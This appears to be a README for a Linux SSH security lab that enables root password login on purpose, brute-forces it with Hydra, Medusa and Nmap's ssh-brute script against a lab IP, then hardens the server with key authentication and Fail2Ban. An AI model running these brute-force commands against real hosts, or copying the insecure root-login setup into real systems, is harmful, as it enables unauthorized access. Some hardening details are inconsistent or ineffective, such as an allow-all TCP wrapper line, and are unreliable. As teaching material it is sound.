\# POC-TASKS

\# 📌 Linux Security - Exploitation & Hardening (PoC)

This repository demonstrates \*\*Remote Access (SSH)
misconfigurations\*\*, including \*\*exploitation and mitigation\*\*.

\-\--

\## 🔹 \*\*Task 2: Remote Access & SSH Hardening\*\*

\### ✅ \*\*Setup: Enabling SSH & Allowing Root Login\*\*

\`\`\`bash \# Install OpenSSH server and enable SSH
┌──(kali㉿kali)-\[\~\] └─\$ sudo apt update && sudo apt install
openssh-server -y ┌──(kali㉿kali)-\[\~\] └─\$ sudo systemctl enable
\--now ssh

\# Allow root login (INSECURE!) and enable password authentication
┌──(kali㉿kali)-\[\~\] └─\$ sudo sed -i \'s/#PermitRootLogin
prohibit-password/PermitRootLogin yes/\' /etc/ssh/sshd_config
┌──(kali㉿kali)-\[\~\] └─\$ sudo sed -i \'s/PasswordAuthentication
no/PasswordAuthentication yes/\' /etc/ssh/sshd_config

\# Restart SSH to apply changes ┌──(kali㉿kali)-\[\~\] └─\$ sudo
systemctl restart ssh \`\`\`

\-\--

\### ✅ \*\*Exploitation: Brute-Force Attack on SSH\*\*

\`\`\`bash \# Using Hydra for brute force attack ┌──(kali㉿kali)-\[\~\]
└─\$ sudo apt install -y hydra ┌──(kali㉿kali)-\[\~\] └─\$ hydra -l root
-P passwords.txt ssh://178.0.0.9 -t 4

\# Using Medusa for brute force attack ┌──(kali㉿kali)-\[\~\] └─\$ sudo
apt install -y medusa ┌──(kali㉿kali)-\[\~\] └─\$ medusa -h 178.0.0.9 -u
root -P passwords.txt -M ssh -n 22

\# Using Nmap to detect open SSH port ┌──(kali㉿kali)-\[\~\] └─\$ sudo
apt install -y nmap ┌──(kali㉿kali)-\[\~\] └─\$ nmap -p 22 178.0.0.9
\--script ssh-brute \--script-args userdb=users.txt,passdb=passwords.txt
\`\`\`

\-\--

\### ✅ \*\*Mitigation: Hardening SSH Security\*\*

\`\`\`bash \# Disable root login and enforce key-based authentication
┌──(kali㉿kali)-\[\~\] └─\$ sudo sed -i \'s/PermitRootLogin
yes/PermitRootLogin no/\' /etc/ssh/sshd_config ┌──(kali㉿kali)-\[\~\]
└─\$ sudo sed -i \'s/PasswordAuthentication yes/PasswordAuthentication
no/\' /etc/ssh/sshd_config

\# Generate SSH key pair ┌──(kali㉿kali)-\[\~\] └─\$ ssh-keygen -t rsa
-b 4096 ┌──(kali㉿kali)-\[\~\] └─\$ ssh-copy-id user@178.0.0.9

\# Restart SSH to apply changes ┌──(kali㉿kali)-\[\~\] └─\$ sudo
systemctl restart ssh \`\`\`

\-\--

\### ✅ \*\*Mitigation: Prevent Brute-Force Attacks with Fail2Ban\*\*

\`\`\`bash \# Install and configure Fail2Ban ┌──(kali㉿kali)-\[\~\] └─\$
sudo apt install -y fail2ban ┌──(kali㉿kali)-\[\~\] └─\$ sudo bash -c
\'cat \<\<EOL \> /etc/fail2ban/jail.local \[sshd\] enabled = true port =
22 filter = sshd logpath = /var/log/auth.log maxretry = 3 bantime = 600
EOL\'

\# Restart Fail2Ban ┌──(kali㉿kali)-\[\~\] └─\$ sudo systemctl restart
fail2ban ┌──(kali㉿kali)-\[\~\] └─\$ sudo fail2ban-client status sshd
\`\`\`

\-\--

\### 🔥 \*\*Additional Hardening Techniques:\*\*

\`\`\`bash \# Set a custom SSH port (e.g., 2222) ┌──(kali㉿kali)-\[\~\]
└─\$ sudo sed -i \'s/#Port 22/Port 2222/\' /etc/ssh/sshd_config
┌──(kali㉿kali)-\[\~\] └─\$ sudo systemctl restart ssh

\# Implement TCP Wrappers ┌──(kali㉿kali)-\[\~\] └─\$ echo \'sshd: ALL\'
\| sudo tee -a /etc/hosts.allow ┌──(kali㉿kali)-\[\~\] └─\$ echo \'ALL:
ALL\' \| sudo tee -a /etc/hosts.deny

\# Disable empty passwords ┌──(kali㉿kali)-\[\~\] └─\$ sudo sed -i
\'s/PermitEmptyPasswords yes/PermitEmptyPasswords no/\'
/etc/ssh/sshd_config ┌──(kali㉿kali)-\[\~\] └─\$ sudo systemctl restart
ssh \`\`\`

\-\--

\### 📂 \*\*Task 2 - Summary\*\*

\| \*\*Step\*\* \| \*\*Action\*\* \| \*\*Command\*\* \| \| \| \|
\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-- \|
\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\--
\|
\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\--
\|
\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\--
\| \-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-- \| \| 🔹
\*\*Setup\*\* \| Install & start SSH \| \`sudo apt update && sudo apt
install -y openssh-server\`\`sudo systemctl enable ssh\`\`sudo systemctl
start ssh\` \| \| \| \| \| Allow root login (INSECURE) \| \`sudo sed -i
\'s/#PermitRootLogin prohibit-password/PermitRootLogin yes/\'
/etc/ssh/sshd_config\` \| \| \| \| \| Enable password authentication
(INSECURE) \| \`sudo sed -i \'s/PasswordAuthentication
no/PasswordAuthentication yes/\' /etc/ssh/sshd_config\` \| \| \| \| \|
Restart SSH to apply changes \| \`sudo systemctl restart ssh\` \| \| \|
\| 🔹 \*\*Exploitation\*\* \| Hydra Brute-Force Attack \| \`hydra -l
root -P passwords.txt ssh://178.0.0.9 -t 4\` \| \| \| \| \| Medusa
Brute-Force Attack \| \`medusa -h 178.0.0.9 -u root -P passwords.txt -M
ssh -n 22\` \| \| \| \| \| Nmap SSH Enumeration \| \`nmap -p 22
178.0.0.9 \--script ssh-brute \--script-args
userdb=users.txt,passdb=passwords.txt\` \| \| \| \| 🔹
\*\*Mitigation\*\* \| Disable root login (SECURE) \| \`sudo sed -i
\'s/PermitRootLogin yes/PermitRootLogin no/\' /etc/ssh/sshd_config\` \|
\| \| \| \| Enforce Key-Based Authentication \| \`ssh-keygen -t rsa -b
4096\`\`ssh-copy-id user@178.0.0.9\` \| \| \| \| \| Disable Password
Authentication \| \`sudo sed -i \'s/PasswordAuthentication
yes/PasswordAuthentication no/\' /etc/ssh/sshd_config\` \| \| \| \| \|
Set Custom SSH Port \| \`sudo sed -i \'s/#Port 22/Port 2222/\'
/etc/ssh/sshd_config\` \| \| \| \| \| Implement TCP Wrappers \| \\\`echo
\'sshd: ALL\' \| sudo tee -a /etc/hosts.allow\`\<br\>\`echo \'ALL: ALL\'
\| sudo tee -a /etc/hosts.deny\\\` \| \| 🔹 \*\*Prevent Brute-Force\*\*
\| Install Fail2Ban \| \`sudo apt install -y fail2ban\` \| \| \| \| \|
Configure Fail2Ban for SSH \| \\\`echo -e \"\[sshd\]\\nenabled =
true\\nport = ssh\\nfilter = sshd\\nlogpath =
/var/log/auth.log\\nmaxretry = 5\\nbantime = 600\" \| sudo tee
/etc/fail2ban/jail.local\\\` \| \| \| \| Restart Fail2Ban \| \`sudo
systemctl restart fail2ban\` \| \| \| \| \| Check Fail2Ban SSH
protection \| \`sudo fail2ban-client status sshd\` \| \| \|

\-\--

\### END -x-
